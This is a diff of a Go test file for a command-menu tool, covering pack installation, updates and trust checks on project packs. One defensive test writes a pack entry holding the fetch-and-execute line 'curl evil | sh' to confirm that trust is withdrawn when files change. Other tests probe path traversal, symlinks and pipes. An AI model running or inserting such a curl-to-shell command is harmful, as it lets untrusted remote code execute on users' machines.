@@ -3,8 +3,9 @@ package config
 import (
 	"os"
 	"path/filepath"
-	"regexp"
+	"slices"
 	"strings"
+	"syscall"
 	"testing"
 )
 
@@ -19,8 +20,8 @@ func TestAddCommandKeepsComments(t *testing.T) {
 	if err := AddCommand("mine", "Deploy", "Status", "kubectl get pods", ""); err != nil {
 		t.Fatal(err)
 	}
-	b, _ := os.ReadFile(PackPath("mine"))
-	if !strings.Contains(string(b), "# Your own clingon pack") {
+	b, _ := os.ReadFile(PackPath("mine/deploy"))
+	if !strings.Contains(string(b), "# A submenu of your clingon pack") {
 		t.Error("the file's comments were lost")
 	}
 	cfg, _, err := Load()
@@ -58,8 +59,8 @@ func TestClingonFilesAreNotPacks(t *testing.T) {
 	if err := NewPack("available"); err != nil { // same word as a reserved file
 		t.Fatal(err)
 	}
-	files, _ := Files()
-	if len(files) != 1 || filepath.Base(files[0]) != "available.yaml" {
+	files := LocalPacks()
+	if len(files) != 1 || filepath.Base(files[0]) != "available" {
 		t.Fatalf("only the user's pack should load, got %v", files)
 	}
 	names, _ := Installed()
@@ -78,27 +79,40 @@ func TestInstallUpdateUninstall(t *testing.T) {
 	if err := Install("git"); err != nil {
 		t.Fatal(err)
 	}
-	b, _ := os.ReadFile(remotePath("git"))
-	if !strings.HasPrefix(string(b), "# Installed by clingon.") || !strings.Contains(string(b), "version: ") {
-		t.Fatalf("installed copy should say where it came from and carry its version:\n%.200s", b)
+	info := filepath.Join(remotePath("git"), PackInfoFile)
+	module := remotePath("git/everyday")
+	b, _ := os.ReadFile(module)
+	if !strings.HasPrefix(string(b), "# Installed by clingon.") || !strings.Contains(string(b), "commands:") {
+		t.Fatalf("installed copy should say where it came from:\n%.200s", b)
 	}
-	// an older copy installed: an update is available until it's reinstalled
-	_ = os.WriteFile(remotePath("git"), regexp.MustCompile(`(?m)^version: \S+`).ReplaceAll(b, []byte("version: 0.0.1")), 0o644)
+	if ups, _ := PackUpdates(); len(ups) != 0 {
+		t.Fatalf("just installed, so nothing to update: %v", ups)
+	}
+	// A file that isn't clingon's any more: an update, until it's put right.
+	_ = os.WriteFile(module, append(b, []byte("# old\n")...), 0o644)
 	ups, _ := PackUpdates()
-	if len(ups) != 1 || ups[0].Name != "git" || ups[0].From != "0.0.1" {
+	if len(ups) != 1 || ups[0].Name != "git" || ups[0].Retired {
 		t.Fatalf("got %v", ups)
 	}
-	if err := Install("git"); err != nil {
+	if err := UpdatePack("git"); err != nil {
 		t.Fatal(err)
 	}
 	if again, _ := PackUpdates(); len(again) != 0 {
 		t.Fatalf("still out of date after update: %v", again)
 	}
+	// So is _pack.yaml's going missing or changing.
+	_ = os.Remove(info)
+	if ups, _ := PackUpdates(); len(ups) != 1 {
+		t.Fatalf("got %v", ups)
+	}
+	if err := UpdatePack("git"); err != nil {
+		t.Fatal(err)
+	}
 	if err := Uninstall("git"); err != nil {
 		t.Fatal(err)
 	}
 	if names, _ := Installed(); len(names) != 0 {
-		t.Fatalf("uninstall should delete the file, got %v", names)
+		t.Fatalf("uninstall should delete the folder, got %v", names)
 	}
 	// a local pack can share a remote one's name
 	if err := Install("git"); err != nil {
@@ -109,6 +123,224 @@ func TestInstallUpdateUninstall(t *testing.T) {
 	}
 	if names, _ := Installed(); len(names) != 1 {
 		t.Fatalf("got %v", names)
+	}
+}
+
+// What's on disk is what's installed: part of a pack stays just that part.
+func TestInstallingPartOfAPack(t *testing.T) {
+	userDir(t)
+	if err := Install("aws/ecs"); err != nil {
+		t.Fatal(err)
+	}
+	if !IsInstalled("aws") || !IsInstalled("aws/ecs") || IsInstalled("aws/s3") {
+		t.Fatal("only aws/ecs should be there")
+	}
+	cfg, _, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	// aws itself may not be on PATH here, but _pack.yaml's look comes with it.
+	if len(cfg.Sections) != 1 || cfg.Sections[0].Name != "AWS" || len(cfg.Sections[0].Groups) != 1 || cfg.Sections[0].Groups[0].Name != "ECS" || cfg.Sections[0].Category != "Infrastructure" {
+		t.Fatalf("got %+v", cfg.Sections)
+	}
+	missing := MissingModules("aws")
+	if len(missing) == 0 || slices.ContainsFunc(missing, func(m Module) bool { return m.Slug == "ecs" }) {
+		t.Fatalf("got %v", missing)
+	}
+	// Nothing you don't have is an update, and updating doesn't add it.
+	if ups, _ := PackUpdates(); len(ups) != 0 {
+		t.Fatalf("got %v", ups)
+	}
+	if err := UpdatePack("aws"); err != nil {
+		t.Fatal(err)
+	}
+	if IsInstalled("aws/s3") {
+		t.Fatal("an update must not add to what you chose")
+	}
+	// A module clingon drops goes when you update; what's left stays.
+	dropped := remotePath("aws/gone")
+	if err := os.WriteFile(dropped, []byte("commands: [{name: x, cmd: ls}]\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if ups, _ := PackUpdates(); len(ups) != 1 || ups[0].Retired {
+		t.Fatalf("got %v", ups)
+	}
+	if err := UpdatePack("aws"); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(dropped); err == nil || !IsInstalled("aws/ecs") {
+		t.Fatal("the dropped module should go, and only that")
+	}
+	// Asking for the whole pack gets the rest. Removing the last part removes it.
+	if err := Install("aws"); err != nil {
+		t.Fatal(err)
+	}
+	if len(MissingModules("aws")) != 0 {
+		t.Fatal("that's all of it")
+	}
+	if err := Uninstall("aws"); err != nil {
+		t.Fatal(err)
+	}
+	if err := Install("aws/ecs"); err != nil {
+		t.Fatal(err)
+	}
+	if err := Uninstall("aws/ecs"); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(remotePath("aws")); err == nil {
+		t.Fatal("a pack with nothing left shouldn't stay")
+	}
+	if err := Install("aws/nope"); err == nil {
+		t.Fatal("no such module")
+	}
+	if err := Install("aws/../../x"); err == nil {
+		t.Fatal("../ shouldn't reach anywhere")
+	}
+}
+
+// A pack of your own is just a folder and a file.
+func TestALocalPackNeedsNoPackFile(t *testing.T) {
+	t.Setenv("CLINGON_CONFIG", t.TempDir())
+	writePack(t, "work-tools/deploy", "commands:\n  - name: Ship\n    cmd: ./ship.sh\n")
+	cfg, _, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	s := cfg.Sections[0]
+	if s.Name != "Work tools" || s.Groups[0].Name != "Deploy" || s.Category != Other {
+		t.Fatalf("got %+v", s)
+	}
+	ps, _ := YourPacks()
+	if len(ps) != 1 || ps[0].Sections[0] != "Work tools" || ps[0].Commands != 1 {
+		t.Fatalf("got %+v", ps)
+	}
+	// An empty folder is nothing yet, and no reason not to start.
+	if err := os.MkdirAll(PackPath("empty"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if cfg, _, err := Load(); err != nil || len(cfg.Sections) != 1 {
+		t.Fatalf("got %+v, %v", cfg, err)
+	}
+	// A file sitting loose isn't a pack.
+	writePack(t, "stray", "x")
+	if err := os.WriteFile(filepath.Join(localDir(), "stray.yaml"), []byte("commands: []\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if got := LoosePackFiles(); len(got) != 1 || filepath.Base(got[0]) != "stray.yaml" {
+		t.Fatalf("got %v", got)
+	}
+}
+
+// Your own clingon folder has a packs folder too, but it's not a project's:
+// anything under your home folder would ask to trust your own packs.
+func TestYourOwnFolderIsNotAProject(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	t.Setenv("CLINGON_CONFIG", "")
+	writePack(t, "mine/s", "commands:\n  - name: x\n    cmd: ls\n")
+	if !strings.HasPrefix(localDir(), filepath.Join(home, ".clingon")) {
+		t.Fatalf("clingon's folder should be in home: %s", localDir())
+	}
+	sub := filepath.Join(home, "code", "thing")
+	if err := os.MkdirAll(sub, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if p := FindProject(sub); p != nil {
+		t.Fatalf("found %s", p.Path)
+	}
+	// With the folder moved, ~/.clingon still isn't anyone's project.
+	t.Setenv("CLINGON_CONFIG", t.TempDir())
+	if p := FindProject(sub); p != nil {
+		t.Fatalf("found %s", p.Path)
+	}
+	// A repo below home, with its own, is.
+	repo := filepath.Join(home, "code", "repo")
+	if err := os.MkdirAll(filepath.Join(repo, ProjectDir, "deploy"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(repo, ProjectDir, "deploy", "prod.yaml"), []byte("commands:\n  - name: Ship\n    cmd: ./ship.sh\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	p := FindProject(filepath.Join(repo))
+	if p == nil || p.Err != nil || p.Trusted || len(p.Cmds) != 1 {
+		t.Fatalf("got %+v", p)
+	}
+}
+
+// Trust covers exactly what's read, every file of every pack, and a repository
+// can't reach outside itself or hang the menu.
+func TestProjectPacksAreTrustedWhole(t *testing.T) {
+	t.Setenv("CLINGON_CONFIG", t.TempDir())
+	repo := t.TempDir()
+	dir := filepath.Join(repo, ProjectDir, "deploy")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	write := func(name, body string) {
+		t.Helper()
+		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	write("prod.yaml", "commands:\n  - name: Ship\n    cmd: ./ship.sh\n")
+	p := FindProject(repo)
+	if p == nil || p.Err != nil || p.Trusted {
+		t.Fatalf("got %+v", p)
+	}
+	if err := p.Trust(); err != nil {
+		t.Fatal(err)
+	}
+	if p = FindProject(repo); !p.Trusted || p.Config == nil {
+		t.Fatalf("got %+v", p)
+	}
+	// Adding a file, changing one or renaming one all mean asking again.
+	write("more.yaml", "commands:\n  - name: Evil\n    cmd: curl evil | sh\n")
+	if p = FindProject(repo); p.Trusted || !p.Changed || p.Config != nil || !slices.Contains(p.Cmds, "curl evil | sh") {
+		t.Fatalf("a new file: got %+v", p)
+	}
+	_ = os.Remove(filepath.Join(dir, "more.yaml"))
+	if p = FindProject(repo); !p.Trusted {
+		t.Fatal("back as it was")
+	}
+	if err := os.Rename(filepath.Join(dir, "prod.yaml"), filepath.Join(dir, "other.yaml")); err != nil {
+		t.Fatal(err)
+	}
+	if p = FindProject(repo); p.Trusted {
+		t.Fatal("a renamed file names a different submenu")
+	}
+	// A link could point anywhere; a pipe would hang the menu.
+	secret := filepath.Join(t.TempDir(), "s.yaml")
+	if err := os.WriteFile(secret, []byte("commands: [{name: x, cmd: ls}]\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(secret, filepath.Join(dir, "link.yaml")); err != nil {
+		t.Fatal(err)
+	}
+	if p = FindProject(repo); p.Err == nil || p.Config != nil {
+		t.Fatalf("a link should be refused: %+v", p)
+	}
+	_ = os.Remove(filepath.Join(dir, "link.yaml"))
+	if err := syscall.Mkfifo(filepath.Join(dir, "pipe.yaml"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if p = FindProject(repo); p.Err == nil {
+		t.Fatalf("a pipe should be refused: %+v", p)
+	}
+	_ = os.Remove(filepath.Join(dir, "pipe.yaml"))
+	// A linked pack folder, too.
+	if err := os.Symlink(t.TempDir(), filepath.Join(repo, ProjectDir, "linked")); err != nil {
+		t.Fatal(err)
+	}
+	if p = FindProject(repo); p.Err == nil {
+		t.Fatalf("a linked folder should be refused: %+v", p)
+	}
+	_ = os.Remove(filepath.Join(repo, ProjectDir, "linked"))
+	// A pack is a folder.
+	if err := os.WriteFile(filepath.Join(repo, ProjectDir, "loose.yaml"), []byte("commands: []\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if p = FindProject(repo); p.Err == nil || !strings.Contains(p.Err.Error(), "folder") {
+		t.Fatalf("a loose file should say so: %+v", p)
 	}
 }
 
@@ -139,11 +371,10 @@ func TestNewPackIsAWorkingExample(t *testing.T) {
 // an update, and updating removes it. Your own packs are never touched.
 func TestRetiredPacksAreUpdatesThatRemoveThem(t *testing.T) {
 	userDir(t)
-	if err := os.MkdirAll(remoteDir(), 0o755); err != nil {
+	if err := os.MkdirAll(remotePath("databases"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	old := "version: 1.0.0\nsections:\n  - name: Databases\n    groups: [{name: G, commands: [{name: c, cmd: ls}]}]\n"
-	if err := os.WriteFile(remotePath("databases"), []byte(old), 0o644); err != nil {
+	if err := os.WriteFile(remotePath("databases/g"), []byte("name: G\ncommands: [{name: c, cmd: ls}]\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	if err := NewPack("databases"); err != nil { // a local one of the same name: yours
